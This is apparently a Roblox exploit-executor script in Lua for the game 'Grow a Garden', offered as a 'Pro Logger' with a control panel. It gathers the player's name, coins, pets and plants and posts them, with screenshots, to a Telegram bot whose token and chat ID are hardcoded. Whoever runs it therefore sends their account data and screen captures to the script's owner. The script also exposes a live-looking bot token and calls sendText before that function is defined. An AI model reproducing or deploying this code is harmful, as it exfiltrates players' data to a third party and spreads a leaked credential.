-- ⚙️ Grow a Garden Pro Logger с GUI и максимальной инфой

local Http = game:GetService("HttpService")
local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local Player = Players.LocalPlayer

local TOKEN   = "8101289751:AAEk6wpg5UkUBY8S5dSRLcTI0M8TJIZssc4"
local CHAT_ID = "5678878569"

local INTERVAL = 60
local running = false

-- 🔁 Отправка HTTP-запросов
local function request(url, body, isJson)
    if syn and syn.request then
        local req = {Url = url, Method = "POST"}
        if isJson then
            req.Headers = {["Content-Type"] = "application/json"}
            req.Body = body
        else
            req.Headers = body.Headers
            req.Body = body.Body
        end
        syn.request(req)
    elseif http_request then
        http_request(isJson and {
            Url = url, Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = body
        } or {
            Url = url, Method = "POST",
            Headers = body.Headers,
            Body = body.Body
        })
    end
end

-- 📸 Скриншот
local function sendScreenshot()
    if getscreenshot then
        local img = getscreenshot()
        local boundary = "----WebKitBoundary"..math.random(1e5,9e5)
        local b = "--"..boundary.."\r\n"..'Content-Disposition: form-data; name="chat_id"'..
                  "\r\n\r\n"..CHAT_ID.."\r\n--"..boundary.."\r\n"..
                  'Content-Disposition: form-data; name="photo"; filename="img.png"'.."\r\nContent-Type: image/png\r\n\r\n"..
                  img.."\r\n--"..boundary.."--"
        request("https://api.telegram.org/bot"..TOKEN.."/sendPhoto", { Headers = {["Content-Type"]="multipart/form-data; boundary="..boundary}, Body = b }, false)
    else
        sendText("⚠️ Скриншоты не поддерживаются!")
    end
end

-- 📤 Отправка текста
local function sendText(data)
    local url = "https://api.telegram.org/bot"..TOKEN.."/sendMessage"
    request(url, Http:JSONEncode(data), true)
end

-- 🧮 Сбор максимальной инфы о питомцах + растениях
local function collectInfo()
    local infoLines = {}

    table.insert(infoLines, "👤 Игрок: " .. Player.Name)
    local coins = Player:FindFirstChild("leaderstats") and Player.leaderstats:FindFirstChild("Coins") and Player.leaderstats.Coins.Value or 0
    local harvest = Player:FindFirstChild("leaderstats") and Player.leaderstats:FindFirstChild("Harvest") and Player.leaderstats.Harvest.Value or 0
    table.insert(infoLines, "💰 Coins: " .. coins .. " | Harvest: " .. harvest)

    local pets = Player:FindFirstChild("Pets") and Player.Pets:GetChildren() or {}
    if #pets > 0 then
        table.insert(infoLines, "🐾 Pets:")
        for _, p in pairs(pets) do
            table.insert(infoLines, "- " .. p.Name)
        end
    else
        table.insert(infoLines, "🐾 Pets: Нет")
    end

    local plantLines = {}
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:FindFirstChild("Owner") and obj.Owner.Value == Player then
            local n = obj.Name
            local lvl = obj:FindFirstChild("Level") and tostring(obj.Level.Value) or "?"
            local mut = obj:FindFirstChild("Mutation") and tostring(obj.Mutation.Value) or "none"
            local price = obj:FindFirstChild("Price") and tostring(obj.Price.Value) or "?"
            table.insert(plantLines, string.format("%s | L%s | M: %s | $%s", n, lvl, mut, price))
        end
    end
    if #plantLines > 0 then
        table.insert(infoLines, "🌱 Plants:")
        for _, pl in ipairs(plantLines) do table.insert(infoLines, "- " .. pl) end
    else
        table.insert(infoLines, "🌱 Plants: Нет")
    end

    table.insert(infoLines, "🕒 " .. os.date("%Y-%m-%d %H:%M:%S"))
    return table.concat(infoLines, "\n")
end

-- 📦 Полный лог + фото
local function sendFullLog()
    local text = collectInfo()
    sendText({chat_id = CHAT_ID, text = text})
    task.wait(1.5)
    sendScreenshot()
end

-- 🔁 Авто-логгер
task.spawn(function()
    while true do
        if running then sendFullLog() end
        task.wait(INTERVAL)
    end
end)

-- 🖼 GUI панель
local gui = Instance.new("ScreenGui")
gui.Name = "GrowLoggerProGUI"
gui.Parent = Player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0,260,0,200)
frame.Position = UDim2.new(0,15,0,120)
frame.BackgroundColor3 = Color3.fromRGB(30,30,30)

local function mkBtn(txt,y,col,cb)
    local b = Instance.new("TextButton", frame)
    b.Position = UDim2.new(0,10,0,y)
    b.Size = UDim2.new(1,-20,0,35)
    b.Text = txt; b.BackgroundColor3 = col; b.TextColor3 = Color3.new(1,1,1)
    b.Font = Enum.Font.SourceSans; b.TextSize = 15
    b.MouseButton1Click:Connect(cb)
end

mkBtn("▶️ Старт авто", 10, Color3.fromRGB(70,180,70), function()
    running = true; sendText({chat_id = CHAT_ID, text = "✅ Авто логгер включен"})
end)
mkBtn("⏹ Стоп авто", 60, Color3.fromRGB(180,70,70), function()
    running = false; sendText({chat_id = CHAT_ID, text = "⛔ Авто логгер выключен"})
end)
mkBtn("📤 Отправить сейчас", 110, Color3.fromRGB(70,70,180), sendFullLog)
mkBtn("✖ Убрать GUI", 160, Color3.fromRGB(120,120,120), function()
    gui:Destroy()
end)
